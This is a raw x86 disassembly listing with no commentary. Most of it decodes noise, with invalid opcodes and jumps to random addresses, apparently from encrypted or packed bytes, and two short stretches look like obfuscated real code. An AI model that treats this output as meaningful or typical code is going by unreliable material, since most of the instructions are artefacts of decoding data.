  4055ba:	test   DWORD PTR [ebp+0x22],0x1dff607c
  4055c1:	cmc    
  4055c2:	mul    esp
  4055c4:	out    0xb8,al
  4055c6:	fcom   DWORD PTR [eax+ecx*4]
  4055c9:	mov    al,ds:0xe2557082
  4055ce:	mov    dl,0x50
  4055d0:	or     DWORD PTR [ebp-0x6b37290f],esi
  4055d6:	jb     0x97bb5729
  4055dc:	mov    WORD PTR [edi-0x18ff8674],es
  4055e2:	push   esi
  4055e3:	inc    ebx
  4055e4:	repnz dec ebx
  4055e6:	jle    0x40558b
  4055e8:	into   
  4055e9:	jmp    0x91085206
  4055ee:	mov    esi,0x2c199d20
  4055f3:	add    DWORD PTR [edi],edi
  4055f5:	fistp  DWORD PTR [edi+0x5e]
  4055f8:	arpl   WORD PTR [ebp*8+0x7ec4b9d5],bx
  4055ff:	adc    al,0x4
  405601:	call   0x5609:0x648f111e
  405608:	in     al,0xae
  40560a:	enter  0x50a8,0xc0
  40560e:	add    DWORD PTR [esi],edi
  405610:	push   ebp
  405611:	or     al,0x5a
  405613:	icebp  
  405614:	sar    DWORD PTR [edi-0x36],1
  405617:	das    
  405618:	mov    ds:0x30c8a0d4,eax
  40561d:	in     eax,dx
  40561e:	(bad)  
  40561f:	clc    
  405620:	loopne 0x405683
  405622:	or     eax,DWORD PTR [ebp-0x7f]
  405625:	jmp    0x40568d
  405627:	dec    eax
  405628:	mov    bl,0xa0
  40562a:	sbb    esi,edx
  40562c:	into   
  40562d:	adc    DWORD PTR ds:0x6cc512db,edi
  405633:	add    ch,BYTE PTR [ecx]
  405635:	loop   0x405611
  405637:	nop
  405638:	sbb    BYTE PTR [edx-0x6d7d8628],0x72
  40563f:	stos   BYTE PTR es:[edi],al
  405640:	into   
  405641:	sar    DWORD PTR [edx+0x533a93cd],cl
  405647:	xor    BYTE PTR [esi+eax*1],bh
  40564a:	(bad)  [esi-0x29]
  40564d:	sub    BYTE PTR [eax+ecx*4+0x8],dl
  405651:	jnp    0x405667
  405653:	sbb    BYTE PTR [eax],al
  405655:	cdq    
  405656:	icebp  
  405657:	cmc    
  405658:	pusha  
  405659:	adc    BYTE PTR [ecx],cl
  40565b:	inc    esi
  40565c:	pop    ecx
  40565d:	outs   dx,BYTE PTR ds:[esi]
  40565e:	push   ds
  40565f:	sar    BYTE PTR [esi+edi*8+0x726a91a8],cl
  405666:	rcr    DWORD PTR [ecx+esi*8],0xa8
  40566a:	pop    es
  40566b:	loopne 0x4056de
  40566d:	(bad)  
  40566e:	repnz adc BYTE PTR [ecx-0x3],0xb1
  405673:	sbb    eax,0xd3be1d1f
  405678:	xor    DWORD PTR [ebx-0x7f9e2fc8],edi
  40567e:	push   ecx
  40567f:	mov    esp,DWORD PTR [eax]
  405681:	(bad)  
  405682:	xlat   BYTE PTR ds:[ebx]
  405683:	mov    bl,0x97
  405685:	leave  
  405686:	call   0x9d41:0x3aed2a7e
  40568d:	shl    BYTE PTR [esi-0x5],cl
  405690:	stc    
  405691:	xor    dh,cl
  405693:	repnz repnz test al,0x84
  405697:	loope  0x405684
  405699:	les    eax,FWORD PTR [edi+0x35]
  40569c:	pop    es
  40569d:	sti    
  40569e:	and    eax,0x602de32
  4056a3:	pop    edi
  4056a4:	xchg   ebp,eax
  4056a5:	mov    al,0x4e
  4056a7:	or     BYTE PTR [edx],0xf6
  4056aa:	in     eax,0x3e
  4056ac:	test   al,0x44
  4056ae:	ins    DWORD PTR es:[edi],dx
  4056af:	mov    al,ds:0x4b0c68fd
  4056b4:	popa   
  4056b5:	push   0x1ee27f0e
  4056ba:	fist   WORD PTR [ecx]
  4056bc:	sbb    ah,BYTE PTR [esp+ebp*4+0x4a8f50fa]
  4056c3:	jmp    0xe7ebab8d
  4056c8:	dec    edi
  4056c9:	xchg   ecx,eax
  4056ca:	or     bl,BYTE PTR [ebx-0x39c377a9]
  4056d0:	or     dh,al
  4056d2:	add    DWORD PTR [ecx-0x69],ebx
  4056d5:	test   BYTE PTR [edx+0x61],dl
  4056d8:	add    ebp,DWORD PTR [edx+0x1657576b]
  4056de:	pop    ecx
  4056df:	out    0x9c,eax
  4056e1:	jmp    0x7814:0x6b89a27c
  4056e8:	add    ch,BYTE PTR [ecx]
  4056ea:	fcom   DWORD PTR fs:[ebx+0x1682972d]
  4056f1:	ret    0xf393
  4056f4:	es call 0xcf81:0x55c668f6
  4056fc:	pop    edx
  4056fd:	fld    DWORD PTR [ebp+0x2cf0bad0]
  405703:	inc    ebx
  405704:	fsub   st,st(5)
  405706:	cdq    
  405707:	test   eax,0xf2358370
  40570c:	cmp    dl,ch
  40570e:	mov    ebx,0x9706fc96
  405713:	das    
  405714:	or     DWORD PTR [ecx*8-0x3ce57b57],ebp
  40571b:	jbe    0x4056c9
  40571d:	mov    al,ds:0xb829693f
  405722:	cs sahf 
  405724:	jmp    FWORD PTR [ebx-0xb]
  405727:	add    al,0x46
  405729:	loop   0x40571d
  40572b:	out    dx,eax
  40572c:	(bad)  
  40572d:	sub    DWORD PTR [edx+0x301c06d],ebx
  405733:	pop    esp
  405734:	xchg   ch,al
  405736:	in     al,dx
  405737:	mov    edi,DWORD PTR [ebp+0x207cc03b]
  40573d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40573e:	les    esi,FWORD PTR [eax-0xb]
  405741:	fmul   DWORD PTR [ebp-0x14bd9fa1]
  405747:	xor    ch,BYTE PTR [ecx-0x3522bac6]
  40574d:	add    bl,dh
  40574f:	aam    0xed
  405751:	aas    
  405752:	dec    eax
  405753:	scas   al,BYTE PTR es:[edi]
  405754:	sub    cl,BYTE PTR [edx]
  405756:	fdiv   DWORD PTR [ebx+0x5f]
  405759:	push   eax
  40575a:	add    al,0x5c
  40575c:	sub    al,0xa8
  40575e:	pop    es
  40575f:	push   DWORD PTR [edi]
  405761:	mov    edi,0xab21b9a4
  405766:	mul    BYTE PTR [esi-0x62]
  405769:	xchg   ebx,eax
  40576a:	xor    al,0x7d
  40576c:	pop    eax
  40576d:	loopne 0x4056f3
  40576f:	mov    edx,0x3c0ecbda
  405774:	inc    edi
  405775:	das    
  405776:	push   esp
  405777:	xor    ah,ah
  405779:	mov    ebp,0x8b7dbdaf
  40577e:	push   0xfe0496f7
  405783:	imul   eax,DWORD PTR [edi-0xb0ec89d],0xbd737846
  40578d:	adc    esp,DWORD PTR [ebx+0x64]
  405790:	neg    BYTE PTR [ebp-0x15]
  405793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405794:	shr    DWORD PTR [edi+0x2563da31],1
  40579a:	inc    ebp
  40579b:	ins    DWORD PTR es:[edi],dx
  40579c:	std    
  40579d:	into   
  40579e:	imul   esi,DWORD PTR [ebp+0x639cb62d],0xf87b29c6
  4057a8:	mov    edi,0x200fd80d
  4057ad:	les    ecx,FWORD PTR [ebx]
  4057af:	fdiv   DWORD PTR ds:0xe250bf0a
  4057b5:	bound  edi,QWORD PTR [ebx]
  4057b7:	xor    DWORD PTR ss:[ecx],ebp
  4057ba:	int3   
  4057bb:	retf   
  4057bc:	leave  
  4057bd:	pop    edi
  4057be:	rol    BYTE PTR [eax],1
  4057c0:	dec    edx
  4057c1:	mov    ebx,DWORD PTR [ebx+edi*8+0xd]
  4057c5:	das    
  4057c6:	das    
  4057c7:	mov    edi,cs
  4057c9:	stc    
  4057ca:	pop    es
  4057cb:	jns    0x4057af
  4057cd:	(bad)  
  4057ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057cf:	js     0x405813
  4057d1:	mov    eax,ds:0x61e5fbdd
  4057d6:	jecxz  0x405761
  4057d8:	test   BYTE PTR [ebp+0x24a550a0],ah
  4057de:	cmp    DWORD PTR [ecx+0x22],edx
  4057e1:	jmp    0x2c9603ab
  4057e6:	mov    edx,0xad332b8d
  4057eb:	sub    eax,0x7ab49d4a
  4057f0:	int    0x4e
  4057f2:	ins    BYTE PTR es:[edi],dx
  4057f3:	jno    0x405837
  4057f5:	cmp    dl,BYTE PTR [ecx-0x23145691]
  4057fb:	mov    ds:0x39fe85e3,eax
  405800:	popf   
  405801:	cwde   
  405802:	xlat   BYTE PTR ds:[ebx]
  405803:	aam    0xeb
  405805:	dec    edi
  405806:	scas   al,BYTE PTR es:[edi]
  405807:	mov    eax,0x59523b32
  40580c:	push   esi
  40580d:	sub    eax,0xcda46290
  405812:	mov    edx,ebx
  405814:	rol    BYTE PTR [edx],cl
  405816:	or     eax,DWORD PTR [edi+eiz*8]
  405819:	cwde   
  40581a:	mov    esp,0x7e8cb459
  40581f:	ins    DWORD PTR es:[edi],dx
  405820:	psllq  mm3,QWORD PTR [ecx]
  405823:	push   0xc89b46a8
  405828:	sub    BYTE PTR [esi+0x1625cfa],cl
  40582e:	in     al,0x1
  405830:	pop    ds
  405831:	popf   
  405832:	jno    0x405888
  405834:	sub    ecx,DWORD PTR [ebp-0x33b8527c]
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x42839b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428187,0x0
  40584d:	mov    DWORD PTR ds:0x428277,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428277,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428187,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e84
  40588d:	adc    DWORD PTR ds:0x42831b,edx
  405893:	or     DWORD PTR ds:0x42824b,0x369f
  40589d:	neg    DWORD PTR ds:0x42818b
  4058a3:	sub    DWORD PTR ds:0x42816b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x405954
  405910:	retf   
  405911:	imul   esi,DWORD PTR [eax+0x1818b16d],0xffffff9e
  405918:	adc    bl,BYTE PTR [eax]
  40591a:	sbb    BYTE PTR [eax],dl
  40591c:	push   ss
  40591d:	gs das 
  40591f:	xor    BYTE PTR [eax+0xb04ba00],ch
  405925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405926:	cs jmp 0x405973
  405929:	das    
  40592a:	jnp    0x40590f
  40592c:	pop    es
  40592d:	jle    0x40591a
  40592f:	mov    bh,0x74
  405931:	(bad)  
  405932:	retf   0xc94d
  405935:	call   0x2b20:0x8249593a
  40593c:	xchg   ebp,eax
  40593d:	inc    edx
  40593e:	lods   al,BYTE PTR ds:[esi]
  40593f:	popa   
  405940:	retf   0xaafa
  405943:	jecxz  0x405999
  405945:	jmp    DWORD PTR [ecx-0x78]
  405948:	ret    
  405949:	push   eax
  40594a:	les    esp,FWORD PTR [edi-0x3995b160]
  405950:	imul   ebp,DWORD PTR [edi+0x30],0x5af9ed75
  405957:	mov    BYTE PTR [ecx-0x3c],bh
  40595a:	cmp    ecx,DWORD PTR [esi]
  40595c:	fild   WORD PTR [edx]
  40595e:	dec    ebp
  40595f:	sub    ch,al
  405961:	popa   
  405962:	add    al,0x20
  405964:	shr    esp,1
  405966:	fdiv   QWORD PTR [edx+0x62]
  405969:	call   0x8ba2:0xaf15bfbe
  405970:	jle    0x4058f4
  405972:	test   BYTE PTR [edi-0x39],bh
  405975:	(bad)  [edx+0x6e2f6196]
  40597b:	xchg   edi,eax
  40597c:	ret    
  40597d:	xchg   ecx,eax
  40597e:	cmp    DWORD PTR [edi+0x5],eax
  405981:	test   BYTE PTR [ecx+eax*8+0x164ef9be],bl
  405988:	les    eax,FWORD PTR [ecx-0x71c71b29]
  40598e:	push   edx
  40598f:	data16 jge 0x405a05
  405992:	(bad)  
  405993:	(bad)  
  405995:	xor    al,0x14
  405997:	shl    DWORD PTR es:0x80032f66,cl
  40599e:	loopne 0x405924
  4059a0:	out    dx,al
  4059a1:	addr16 into 
  4059a3:	xchg   ecx,eax
  4059a4:	or     DWORD PTR [esi+edi*1],edx
  4059a7:	into   
  4059a8:	test   DWORD PTR [ecx-0x30],edi
  4059ab:	sub    al,0x7c
  4059ad:	xchg   ebp,eax
  4059ae:	sbb    al,0x67
  4059b0:	sbb    eax,0x121ae21d
  4059b5:	out    0x6b,eax
  4059b7:	dec    edx
  4059b8:	sbb    al,0xb5
  4059ba:	les    esp,FWORD PTR [edx]
  4059bc:	loop   0x405997
  4059be:	sbb    BYTE PTR [eax+0x13],0x68
  4059c2:	sub    al,0x10
  4059c4:	ins    BYTE PTR es:[edi],dx
  4059c5:	pushf  
  4059c6:	test   DWORD PTR [ecx-0x27],0xe95fac3b
  4059cd:	mov    al,BYTE PTR ds:0x7a6b8386
  4059d3:	push   0x281da122
  4059d8:	add    edx,ecx
  4059da:	stos   BYTE PTR es:[edi],al
  4059db:	out    dx,eax
  4059dc:	les    esi,FWORD PTR [esp+eiz*2+0x1c12e89]
  4059e3:	and    cl,bl
  4059e5:	fucom  st(2)
  4059e7:	cs pop edi
  4059e9:	neg    ebp
  4059eb:	add    DWORD PTR [ecx],edx
  4059ed:	std    
  4059ee:	cld    
  4059ef:	stos   BYTE PTR es:[edi],al
  4059f0:	test   ecx,0x6b1b5e46
  4059f6:	sbb    eax,DWORD PTR ds:0xf2a97a0c
  4059fc:	sahf   
  4059fd:	adc    bl,BYTE PTR [edi+0x3ed3f5b6]
  405a03:	icebp  
  405a04:	idiv   ecx
  405a06:	or     dl,0x9c
  405a09:	fmulp  st(1),st
  405a0b:	jns    0x4059e6
  405a0d:	push   ebp
  405a0e:	push   ds
  405a0f:	fldenv [ecx-0x5399638f]
  405a15:	adc    DWORD PTR [esi-0x6a],ebx
  405a18:	loope  0x405a33
  405a1a:	out    dx,eax
  405a1b:	and    BYTE PTR [ecx+edi*4-0xf],ah
  405a1f:	idiv   DWORD PTR [eax-0x9ff9a32]
  405a25:	cmp    al,0x7
  405a27:	jp     0x405a7c
  405a29:	mov    bl,0x54
  405a2b:	retf   0xd971
  405a2e:	adc    ah,BYTE PTR [ebx]
  405a30:	cdq    
  405a31:	push   ds
  405a32:	rol    edi,cl
  405a34:	xor    al,0xfe
  405a36:	add    al,0x50
  405a38:	scas   eax,DWORD PTR es:[edi]
  405a39:	sub    DWORD PTR [ebp+0x37],edi
  405a3c:	jno    0x405aa1
  405a3e:	jne    0x405a57
  405a40:	adc    dl,BYTE PTR [edi+ecx*1+0xa1219a1]
  405a47:	retf   0xe4cf
  405a4a:	cld    
  405a4b:	jne    0x405aac
  405a4d:	jle    0x405a55
  405a4f:	daa    
  405a50:	test   eax,0x3330e1cb
  405a55:	mov    ecx,esp
  405a57:	int    0x99
  405a59:	lods   eax,DWORD PTR ds:[esi]
  405a5a:	sub    al,bl
  405a5c:	xor    BYTE PTR [ecx],ch
  405a5e:	nop
  405a5f:	pop    esi
  405a60:	outs   dx,BYTE PTR ds:[esi]
  405a61:	inc    ebx
  405a62:	inc    edx
  405a63:	nop
  405a64:	sti    
  405a65:	pusha  
  405a66:	repz jnp 0x405a26
  405a69:	mov    edi,0x6952a02d
  405a6e:	das    
  405a6f:	pop    edi
  405a70:	push   ebp
  405a71:	ja     0x405aa0
  405a73:	cmc    
  405a74:	jb     0x405a95
  405a76:	sub    al,0x31
  405a78:	lods   al,BYTE PTR ds:[esi]
  405a79:	cs stos BYTE PTR es:[edi],al
  405a7b:	sbb    ecx,esp
  405a7d:	hlt    
  405a7e:	or     eax,0xeacee47
  405a83:	add    eax,0x286e8f71
  405a88:	jne    0x405aa0
  405a8a:	scas   eax,DWORD PTR es:[edi]
  405a8b:	inc    bl
  405a8d:	adc    BYTE PTR [ecx-0x37375c32],bl
  405a93:	sbb    DWORD PTR [esi],ebx
  405a95:	arpl   WORD PTR ds:0x81d1debb,bp
  405a9b:	fisttp QWORD PTR [edx]
  405a9d:	jmp    0x405b04
  405a9f:	in     al,0xa5
  405aa1:	mov    al,0x76
  405aa3:	das    
  405aa4:	(bad)  
  405aa5:	sub    DWORD PTR [ecx],0xbb918bc1
  405aab:	test   DWORD PTR [esi+eiz*4],ebx
  405aae:	sbb    eax,0x89a4f256
  405ab3:	shr    cl,0xb
  405ab6:	call   0xe501f7d9
  405abb:	js     0x405a91
  405abd:	cmc    
  405abe:	fsub   st(1),st
  405ac0:	bound  eax,QWORD PTR ds:0xcec39b5f
  405ac6:	xchg   ecx,eax
  405ac7:	hlt    
  405ac8:	sub    al,0xe2
  405aca:	(bad)  
  405acb:	jns    0x405a4f
  405acd:	leave  
  405ace:	jno    0x405b1a
  405ad0:	jae    0x405ad3
  405ad2:	push   esi
  405ad3:	pusha  
  405ad4:	(bad)  
  405ad5:	sbb    dl,BYTE PTR [eax+0x30]
  405ad8:	jo     0x405ab6
  405ada:	push   edi
  405adb:	clc    
  405adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405add:	jmp    0xff1201ae
  405ae2:	jl     0x405b44
  405ae4:	pop    ebp
  405ae5:	inc    ebx
  405ae6:	stc    
  405ae7:	pop    edi
  405ae8:	xor    al,0x4d
  405aea:	mov    bh,0xff
  405aec:	pop    es
  405aed:	push   es
  405aee:	push   edi
  405aef:	ds inc ebp
  405af1:	lods   al,BYTE PTR ds:[esi]
  405af2:	jne    0x405aba
  405af4:	pop    esp
  405af5:	jnp    0x405b41
  405af7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405af8:	mov    ebx,0x20611f88
  405afe:	and    eax,0x238795eb
  405b03:	mov    bh,0x5a
  405b05:	xchg   ecx,eax
  405b06:	pop    eax
  405b07:	rcr    DWORD PTR [edi+0x7a],0x97
  405b0b:	xchg   ebp,eax
  405b0c:	dec    ebp
  405b0d:	test   al,0xdd
  405b0f:	retf   
  405b10:	addr16 (bad) 
  405b12:	and    eax,0xf69dedf8
  405b17:	(bad)  
  405b18:	jae    0x405aa5
  405b1a:	loopne 0x405ad0
  405b1c:	pop    ebp
  405b1d:	push   edi
  405b1e:	rcl    esp,0x8c
  405b21:	rol    DWORD PTR [esi+edi*8],0x1b
  405b25:	dec    ecx
  405b26:	daa    
  405b27:	test   BYTE PTR [eax-0x1993a7bb],al
  405b2d:	ret    
  405b2e:	bswap  eax
  405b30:	pushf  
  405b31:	sbb    DWORD PTR [eax-0x55779133],edi
  405b37:	das    
  405b38:	dec    eax
  405b39:	out    dx,al
  405b3a:	dec    esi
  405b3b:	jae    0x405bae
  405b3d:	mov    ds:0x6df3df08,eax
  405b42:	test   al,0x88
  405b44:	test   BYTE PTR [edi+0x5a],al
  405b47:	fidivr WORD PTR [eax+0x7427b3d7]
  405b4d:	xchg   esi,eax
  405b4e:	sbb    ecx,DWORD PTR [ebp-0x5f]
  405b51:	dec    eax
  405b52:	std    
  405b53:	add    ch,bl
  405b55:	in     al,dx
  405b56:	ins    BYTE PTR es:[edi],dx
  405b57:	fidiv  WORD PTR [edx+0x21]
  405b5a:	mov    eax,ds:0xc50f90a0
  405b5f:	dec    BYTE PTR [ebx]
  405b61:	pusha  
  405b62:	fdecstp 
  405b64:	jp     0x405bb2
  405b66:	cs xor al,0x88
  405b69:	dec    edi
  405b6a:	sti    
  405b6b:	jmp    0x95e741cf
  405b70:	xchg   esp,eax
  405b71:	sub    edi,DWORD PTR [edi+edi*2+0x70cb1f61]
  405b78:	xchg   ecx,eax
  405b79:	shl    edi,cl
  405b7b:	popa   
  405b7c:	mov    cs,WORD PTR [ebp+0x1ced516d]
  405b82:	dec    edx
  405b83:	sbb    al,BYTE PTR [ebx-0x545d31a3]
  405b89:	ret    0x651a
  405b8c:	or     BYTE PTR [edx-0x7f45b281],ah
  405b92:	inc    ebx
  405b93:	das    
  405b94:	in     al,dx
  405b95:	inc    edi
  405b96:	jbe    0x405b55
  405b98:	jb     0x405b52
  405b9a:	pop    ebp
  405b9b:	inc    edx
  405b9c:	mov    al,0x9c
  405b9e:	scas   eax,DWORD PTR es:[edi]
  405b9f:	push   ebp
  405ba0:	cmp    al,0xc0
  405ba2:	adc    dl,bh
  405ba4:	inc    ebp
  405ba5:	cmp    DWORD PTR [ebx],0xfffffff6
  405ba8:	cmp    ebp,ebp
  405baa:	mov    ds:0xc978bd86,al
  405baf:	ds cmp al,0x7b
  405bb2:	xchg   DWORD PTR [ecx+ecx*8],ebx
  405bb5:	cdq    
  405bb6:	or     esi,edi
  405bb8:	(bad)  
  405bba:	push   ds
  405bbb:	pop    ss
  405bbc:	arpl   WORD PTR [edx+0x10],bp
  405bbf:	iret   
  405bc0:	stos   BYTE PTR es:[edi],al
  405bc1:	pop    es
  405bc2:	ins    DWORD PTR es:[edi],dx
  405bc3:	sbb    BYTE PTR [edi],bh
  405bc5:	xor    BYTE PTR [esi],cl
  405bc7:	addr16 add esi,edx
  405bca:	cmp    BYTE PTR [eax],bl
  405bcc:	scas   al,BYTE PTR es:[edi]
  405bcd:	jb     0x405b9a
  405bcf:	inc    bp
  405bd1:	mov    cl,0xc
  405bd3:	pop    edi
  405bd4:	ins    DWORD PTR es:[edi],dx
  405bd5:	(bad)  
  405bd6:	mov    cl,0xe
  405bd8:	mov    ebp,0x89ed9c65
  405bdd:	mov    esi,0xbb294432
  405be2:	inc    edx
  405be3:	iret   
  405be4:	retf   0x6973
  405be7:	test   eax,0x5d155cd9
  405bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bed:	pushf  
  405bee:	ja     0x405c34
  405bf0:	popa   
  405bf1:	rcl    DWORD PTR [ebx],1
  405bf3:	clc    
  405bf4:	jb     0x405c25
  405bf6:	cmp    BYTE PTR [ecx-0x71c4eeca],ah
  405bfc:	shl    DWORD PTR ds:0x8d344bdf,cl
  405c02:	imul   BYTE PTR [ebp+0x40]
  405c05:	popf   
  405c06:	dec    esp
  405c07:	scas   eax,DWORD PTR es:[edi]
  405c08:	mov    esp,0xf67da167
  405c0d:	push   ebp
  405c0e:	stos   DWORD PTR es:[edi],eax
  405c0f:	jge    0x405c71
  405c11:	ror    BYTE PTR [edi-0x77],1
  405c14:	test   al,0xb9
  405c16:	out    0xb3,eax
  405c18:	pushf  
  405c19:	jmp    0x405c6c
  405c1b:	add    al,0xb
  405c1d:	dec    edx
  405c1e:	or     bh,BYTE PTR [edi]
  405c20:	dec    ebp
  405c21:	inc    eax
  405c22:	inc    eax
  405c23:	sbb    eax,0x8dfb0c84
  405c28:	sahf   
  405c29:	sub    bh,BYTE PTR [edi-0x4b468df]
  405c2f:	fild   DWORD PTR [edx+0x55]
  405c32:	mov    bh,0xbf
  405c34:	xlat   BYTE PTR ds:[ebx]
  405c35:	mov    al,0x8a
  405c37:	pusha  
  405c38:	idiv   dl
  405c3a:	dec    ecx
  405c3b:	cdq    
  405c3c:	and    bl,bl
  405c3e:	xor    eax,0x1e76482b
  405c43:	xlat   BYTE PTR ds:[ebx]
  405c44:	ja     0x405c0e
  405c46:	or     BYTE PTR [eax+0x75fd4217],bh
  405c4c:	inc    edx
  405c4d:	aaa    
  405c4e:	inc    edi
  405c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c50:	das    
  405c51:	dec    ecx
  405c52:	ficom  DWORD PTR [edx-0x39a49e64]
  405c58:	mov    ds:0xf8547ecc,al
  405c5d:	sbb    eax,DWORD PTR [ebx-0x10996a4a]
  405c63:	test   al,0x21
  405c65:	scas   eax,DWORD PTR es:[edi]
  405c66:	test   eax,0x82d85b1e
  405c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c6c:	loop   0x405cd7
  405c6e:	cmp    DWORD PTR [ebp-0x5f],edx
  405c71:	jle    0x405cd1
  405c73:	lock mov al,0x52
  405c76:	fld    st(3)
  405c78:	sub    al,0x4e
  405c7a:	mov    al,0xbf
  405c7c:	xor    BYTE PTR [edi-0x1f],0xad
  405c80:	sub    eax,0xfdbb92aa
  405c85:	in     eax,dx
  405c86:	push   esi
  405c87:	jnp    0x405cb3
  405c89:	in     al,0x13
  405c8b:	aas    
  405c8c:	dec    edx
  405c8d:	mov    esi,0xfdec7cb5
  405c92:	test   DWORD PTR [ebp+0x4ee73983],esi
  405c98:	bound  edi,QWORD PTR [esi-0x49]
  405c9b:	ja     0x405c22
  405c9d:	mov    ds:0x4dc72055,al
  405ca2:	in     al,dx
  405ca3:	scas   al,BYTE PTR es:[edi]
  405ca4:	adc    BYTE PTR [eax-0x31],ah
  405ca7:	xor    BYTE PTR [esp+ecx*4+0xa],ch
  405cab:	xchg   BYTE PTR [edx+0x5727a1c],ch
  405cb1:	(bad)  
  405cb2:	das    
  405cb3:	adc    BYTE PTR ss:[ebx],bh
  405cb6:	or     esp,edx
  405cb8:	je     0x405cb3
  405cba:	(bad)  
  405cbb:	scas   eax,DWORD PTR es:[edi]
  405cbc:	jmp    0x2c00:0x4acdee44
  405cc3:	pop    esi
  405cc4:	gs ss dec ecx
  405cc7:	sub    DWORD PTR [ebx-0x2a69c443],ecx
  405ccd:	call   0xb076e577
  405cd2:	xor    DWORD PTR [esi],eax
  405cd4:	iret   
  405cd5:	rol    BYTE PTR [eax-0x2c188c84],cl
  405cdb:	dec    BYTE PTR [ecx+0x45c7d445]
  405ce1:	loopne 0x405d54
  405ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce4:	jns    0x405cb0
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x25],1
  405d2b:	mov    dh,0xb1
  405d2d:	mov    al,0xf2
  405d2f:	test   eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	xchg   ecx,eax
  405d37:	arpl   WORD PTR [eax+0x31],si
  405d3a:	push   ecx
  405d3b:	push   ecx
  405d3c:	daa    
  405d3d:	pop    ebx
  405d3e:	jge    0x405d9a
  405d40:	pop    ds
  405d41:	add    BYTE PTR [ebp-0x331c7992],bh
  405d47:	pop    ecx
  405d48:	arpl   WORD PTR [edi-0x40],sp
  405d4b:	jg     0x405db4
  405d4d:	pop    esp
  405d4e:	repnz push esi
  405d50:	mov    al,0x10
  405d52:	and    esi,DWORD PTR [edx-0x4bfecdac]
  405d58:	leave  
  405d59:	sbb    DWORD PTR [ebp+0xe51bb4],eax
  405d5f:	mov    dl,0x8c
  405d61:	or     BYTE PTR [ebx-0x37105ec0],0x6a
  405d68:	fdiv   DWORD PTR [esp+edi*2]
  405d6b:	dec    ecx
  405d6c:	mov    bh,BYTE PTR [esi+0x58]
  405d6f:	out    dx,al
  405d70:	into   
  405d71:	leave  
  405d72:	pop    ebp
  405d73:	inc    edx
  405d74:	repz dec ebx
  405d76:	add    eax,0x4db2713e
  405d7b:	mov    fs,WORD PTR [eax+0x64]
  405d7e:	ja     0x405d48
  405d80:	lods   al,BYTE PTR ds:[esi]
  405d81:	or     edx,DWORD PTR [edi+ecx*1-0x59]
  405d85:	or     BYTE PTR [ecx+ebp*2-0x1f],bh
  405d89:	jecxz  0x405d6c
  405d8b:	std    
  405d8c:	ins    DWORD PTR es:[edi],dx
  405d8d:	inc    esi
  405d8e:	dec    esp
  405d90:	jne    0x405d4e
  405d92:	call   0x6b4f9bbc
  405d97:	or     esi,DWORD PTR [edi]
  405d99:	iret   
  405d9a:	sub    dl,cl
  405d9c:	and    eax,0xdfd99154
  405da1:	cmp    BYTE PTR [ecx-0x6104713f],cl
  405da7:	cdq    
  405da8:	gs jle 0x405e0b
